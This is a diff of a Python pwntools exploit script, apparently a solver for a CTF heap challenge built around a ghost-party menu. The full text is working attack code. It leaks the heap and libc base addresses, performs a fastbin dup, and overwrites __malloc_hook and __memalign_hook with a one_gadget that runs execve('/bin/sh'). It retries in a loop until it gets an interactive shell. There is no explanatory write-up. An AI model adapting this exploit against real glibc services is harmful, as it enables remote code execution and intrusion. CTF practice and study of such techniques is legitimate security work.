@@ -6,13 +6,9 @@ sa = lambda p, d, x: p.sendafter(d, x)
 sl = lambda p, x: p.sendline(x)
 s = lambda p, x: p.send(x)
 slan = lambda p, d, n: p.sendlineafter(d, str(n).encode())
-san = lambda p, d, n: p.sendafter(d, str(n).encode())
-sln = lambda p, n: p.sendline(str(n).encode())
-sn = lambda p, n: p.send(str(n).encode())
-ru = lambda p, x: p.recvuntil(x)
-rl = lambda p: p.recvline()
-rn = lambda p, n: p.recvn(n)
-rnt = lambda p, n, t: p.recvn(n, timeout=t)
+ru = lambda p, x, t=5: p.recvuntil(x, timeout=5)
+rl = lambda p, t=5: p.recvline(timeout=t)
+rn = lambda p, n, t=5: p.recvn(n, timeout=t)
 rr = lambda p, t: p.recvrepeat(timeout=t)
 ra = lambda p, t: p.recvall(timeout=t)
 ia = lambda p: p.interactive()
@@ -106,94 +102,32 @@ def conn():
 
 MENU_ADD    = b'1'
 MENU_INFO   = b'2'
-MENU_NIGHT  = b'3'
 MENU_REMOVE = b'4'
-MENU_EXIT   = b'5'
 
 JOIN        = b'1'
-GIVEUP      = b'2'
 JOIN_SPEAK  = b'3'
 
-
-
-WEREWOLF  = b'1'
-DEVIL     = b'2'
-ZOMBIE    = b'3'
-SKULL     = b'4'
-MUMMY     = b'5'
-DULLAHAN  = b'6'
 VAMPIRE   = b'7'
-YUKI      = b'8'
-KASA      = b'9'
 ALAN      = b'10'
 
 def menu(choice):
     sla(p, b'Your choice :', choice)
 
-def _ghost_header(name, age, msg, gtype):
+def add_ghost(name, age, msg, gtype):
     sla(p, b'Name : ', name)
     sla(p, b'Age : ', str(age).encode())
     sla(p, b'Message : ', msg)
     sla(p, b'Choose a type of ghost :', gtype)
 
-def add_werewolf(name, age, msg, trans, join=JOIN):
-    menu(MENU_ADD)
-    _ghost_header(name, age, msg, WEREWOLF)
-    sla(p, b'Full moon ? (1:yes/0:no):', str(trans).encode())
-    sla(p, b'Your choice : ', join)
-
-def add_devil(name, age, msg, power, join=JOIN):
-    menu(MENU_ADD)
-    _ghost_header(name, age, msg, DEVIL)
-    sla(p, b'Add power : ', power)
-    sla(p, b'Your choice : ', join)
-
-def add_zombie(name, age, msg, join=JOIN):
-    menu(MENU_ADD)
-    _ghost_header(name, age, msg, ZOMBIE)
-    sla(p, b'Your choice : ', join)
-
-def add_skull(name, age, msg, bones, join=JOIN):
-    menu(MENU_ADD)
-    _ghost_header(name, age, msg, SKULL)
-    sla(p, b'How many bones ? : ', str(bones).encode())
-    sla(p, b'Your choice : ', join)
-
-def add_mummy(name, age, msg, bandage, join=JOIN):
-    menu(MENU_ADD)
-    _ghost_header(name, age, msg, MUMMY)
-    sla(p, b'Commit on bandage : ', bandage)
-    sla(p, b'Your choice : ', join)
-
-def add_dullahan(name, age, msg, weapon, join=JOIN):
-    menu(MENU_ADD)
-    _ghost_header(name, age, msg, DULLAHAN)
-    sla(p, b'Give a weapon : ', weapon)
-    sla(p, b'Your choice : ', join)
-
 def add_vampire(name, age, msg, blood, join=JOIN):
     menu(MENU_ADD)
-    _ghost_header(name, age, msg, VAMPIRE)
+    add_ghost(name, age, msg, VAMPIRE)
     sla(p, b'Add blood :', blood)
-    sla(p, b'Your choice : ', join)
-
-def add_yuki(name, age, msg, cold, join=JOIN):
-    menu(MENU_ADD)
-    _ghost_header(name, age, msg, YUKI)
-    sla(p, b'Cold :', cold)
-    sla(p, b'Your choice : ', join)
-
-def add_kasa(name, age, msg, foot, eyes, echo, join=JOIN):
-    menu(MENU_ADD)
-    _ghost_header(name, age, msg, KASA)
-    sla(p, b'foot number :', str(foot).encode())
-    sla(p, b'Eyes : ', eyes)
-    sa(p, b'Input to echo :', echo)
     sla(p, b'Your choice : ', join)
 
 def add_alan(name, age, msg, lightsaber, join=JOIN):
     menu(MENU_ADD)
-    _ghost_header(name, age, msg, ALAN)
+    add_ghost(name, age, msg, ALAN)
     sla(p, b'Your lightsaber : ', lightsaber)
     sla(p, b'Your choice : ', join)
 
@@ -205,12 +139,9 @@ def remove_ghost(idx):
     menu(MENU_REMOVE)
     sla(p, b'Choose a ghost which you want to remove from the party : ', str(idx).encode())
 
-def night_parade():
-    menu(MENU_NIGHT)
-
-def shell(name, age, msg, lightsaber, join=JOIN):
+def trigger_hooks(name, age, msg):
     menu(MENU_ADD)
-    _ghost_header(name, age, msg, VAMPIRE)
+    add_ghost(name, age, msg, VAMPIRE)
 
 attempt = 0
 while True:
@@ -219,30 +150,65 @@ while True:
     
     p = conn()
 
+    print("Leaking heap address")
     add_alan(b'alan', 1, b'A', A(0x100))
     show_info(0)
     ru(p, b'Lightsaber : ')
     heap_base = leak_bytes(rn(p, 6), 0x12c30)
     lg("heap base", heap_base)
+
+    print("Leaking libc address")
     add_alan(b'alan', 1, b'A', A(0x100))
     show_info(0)
     ru(p, b'Lightsaber : ')
     libc.address = leak_bytes(rn(p, 6), 0x3c3b78)
     lg("libc base", libc.address)
 
+    print("Fastbin dup")
     add_vampire(b'vampire', 1, b'A', A(0x60))
     add_vampire(b'vampire', 1, b'A', A(0x60), JOIN_SPEAK)
     remove_ghost(2)
     remove_ghost(2)
+
+    # Take 1 chunk out of the entry
     add_vampire(b'vampire', 1, b'A', b'A')
 
-    # input("overwrite to hook")
-    pl = flat(z(0x13-0x8-0x8) + p64(libc.address + 0xf0567) + p64(libc.symbols['memalign']) + p64(libc.address + 0x85A85)).ljust(0x60, b'\0')[:-5] + p64(heap_base + 0x12d70)[:4]
-    add_vampire(p64(libc.symbols['__malloc_hook'] - 0x23).ljust(0x60, b'A'), 1, b'A', pl)
+    print("Overwriting hooks")
+    '''
+    0xf0567 execve("/bin/sh", rsp+0x70, environ)
+    constraints:
+    [rsp+0x70] == NULL
+    '''
+    one_gadget = libc.address + 0xf0567
+    valloc_37 = libc.address + 0x85A85
+    chunk_at_fastbins_0x80 = heap_base + 0x12d70
+    blood = flat(
+        z(0x3),
+        one_gadget, # memalign hook
+        0,
+        valloc_37 # malloc hook
+    ).ljust(0x60, b'\0')[:-5] + p64(chunk_at_fastbins_0x80)[:4]
+
+    malloc_hook = libc.symbols['__malloc_hook']
+    name = p64(malloc_hook - 0x23).ljust(0x60, b'A')
 
     attach(p)
-    shell(b'/bin/sh', 1, b'A', A(0x100), JOIN_SPEAK)
 
-    ia(p)
-    p.close()
-    break
+    try:
+        add_vampire(name, 1, b'A', blood)
+
+        print("Spawn shell")
+        trigger_hooks(b'A', 1, b'A')
+
+        sl(p, b'id')
+        r = ru(p, b'id')
+        if len(r) < 1:
+            raise Exception
+
+        ia(p)
+        p.close()
+        break
+    except:
+        print("Failed attempt")
+        p.close()
+        continue
